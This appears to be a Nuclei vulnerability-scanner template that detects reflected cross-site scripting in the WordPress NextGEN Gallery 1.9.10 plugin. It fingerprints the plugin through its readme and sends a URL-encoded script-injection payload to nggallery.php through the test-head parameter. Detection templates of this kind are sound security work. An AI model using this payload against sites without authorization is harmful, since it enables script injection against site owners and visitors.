id: wp-nextgen-xss

info:
  name: WordPress NextGEN Gallery 1.9.10 - 跨站脚本漏洞
  author: daffainfo
  severity: high
  description: WordPress NextGEN Gallery 1.9.10 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  reference:
    - https://www.exploit-db.com/exploits/38178
    - http://web.archive.org/web/20210123110617/https://www.securityfocus.com/bid/57200/info
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  metadata:
    max-request: 2
  tags: wp-plugin,edb,wordpress,xss,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/nextgen-gallery/readme.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        internal: true
        words:
          - '= NextGEN Gallery'

  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/nextgen-gallery/nggallery.php?test-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "</script><script>alert(document.domain)</script>"
        part: body

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
